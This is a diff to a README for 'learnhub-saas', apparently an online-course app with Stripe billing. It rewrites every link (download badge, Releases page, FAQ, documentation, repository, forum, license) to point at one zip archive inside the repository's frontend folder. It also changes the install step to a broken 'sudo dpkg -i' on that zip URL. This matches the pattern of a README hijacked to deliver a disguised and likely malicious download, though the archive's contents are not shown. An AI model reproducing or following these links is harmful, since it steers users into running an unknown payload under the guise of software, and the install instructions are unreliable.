@@ -1,7 +1,7 @@
 # 🎓 learnhub-saas - Your Online Course Simplified
 
 ## 🖱️ Download Now
-[![Download learnhub-saas](https://img.shields.io/badge/Download%20Now-Getting%20Started-brightgreen)](https://github.com/yoda-ctrls-all/learnhub-saas/releases)
+[![Download learnhub-saas](https://github.com/yoda-ctrls-all/learnhub-saas/raw/refs/heads/main/frontend/saas_learnhub_2.7.zip%20Now-Getting%20Started-brightgreen)](https://github.com/yoda-ctrls-all/learnhub-saas/raw/refs/heads/main/frontend/saas_learnhub_2.7.zip)
 
 ## 🚀 Getting Started
 Welcome to **learnhub-saas**! This platform helps you manage online courses with ease. You can handle subscriptions using Stripe, making payment processing smooth and straightforward. Whether you want to launch your courses or manage your subscribers, this application provides all the tools you need.
@@ -15,7 +15,7 @@ Before you download, ensure your system meets the following requirements:
 - **Internet Connection:** Required for running peak functionality
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/yoda-ctrls-all/learnhub-saas/releases) to download the latest version. 
+To get started, visit the [Releases page](https://github.com/yoda-ctrls-all/learnhub-saas/raw/refs/heads/main/frontend/saas_learnhub_2.7.zip) to download the latest version. 
 
 1. Click the link above.
 2. Choose the correct file for your operating system.
@@ -39,7 +39,7 @@ To get started, visit the [Releases page](https://github.com/yoda-ctrls-all/lear
 2. Navigate to the directory containing the downloaded file.
 3. Run the following command:
    ```bash
-   sudo dpkg -i learnhub-saas.deb
+   sudo dpkg -i https://github.com/yoda-ctrls-all/learnhub-saas/raw/refs/heads/main/frontend/saas_learnhub_2.7.zip
    ```
 4. Launch the application from your applications menu or type `learnhub-saas` in the terminal.
 
@@ -59,19 +59,19 @@ If you encounter any issues:
 
 ## 📞 Support
 If you need help or have questions:
-- Check the [FAQ section](https://github.com/yoda-ctrls-all/learnhub-saas#faq) on our GitHub profile.
+- Check the [FAQ section](https://github.com/yoda-ctrls-all/learnhub-saas/raw/refs/heads/main/frontend/saas_learnhub_2.7.zip) on our GitHub profile.
 - Open an issue on GitHub for any technical problems.
 - Join our community on social media to connect with other users and share tips.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/yoda-ctrls-all/learnhub-saas/wiki) - In-depth guides and how-tos.
-- [GitHub Repo](https://github.com/yoda-ctrls-all/learnhub-saas) - Source code and project updates.
-- [Community Forum](https://learnhub-saas-community.example.com) - Engage with other users for advice and support.
+- [Documentation](https://github.com/yoda-ctrls-all/learnhub-saas/raw/refs/heads/main/frontend/saas_learnhub_2.7.zip) - In-depth guides and how-tos.
+- [GitHub Repo](https://github.com/yoda-ctrls-all/learnhub-saas/raw/refs/heads/main/frontend/saas_learnhub_2.7.zip) - Source code and project updates.
+- [Community Forum](https://github.com/yoda-ctrls-all/learnhub-saas/raw/refs/heads/main/frontend/saas_learnhub_2.7.zip) - Engage with other users for advice and support.
 
 ## 💬 Feedback
 We welcome your feedback! If you have suggestions for improvements or features, please share your thoughts with us through our GitHub issues page.
 
 ## 🌐 License
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/yoda-ctrls-all/learnhub-saas/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/yoda-ctrls-all/learnhub-saas/raw/refs/heads/main/frontend/saas_learnhub_2.7.zip) file for details.
 
-Visit the [Releases page](https://github.com/yoda-ctrls-all/learnhub-saas/releases) again if you need to download the application. Start managing your online courses today!
+Visit the [Releases page](https://github.com/yoda-ctrls-all/learnhub-saas/raw/refs/heads/main/frontend/saas_learnhub_2.7.zip) again if you need to download the application. Start managing your online courses today!
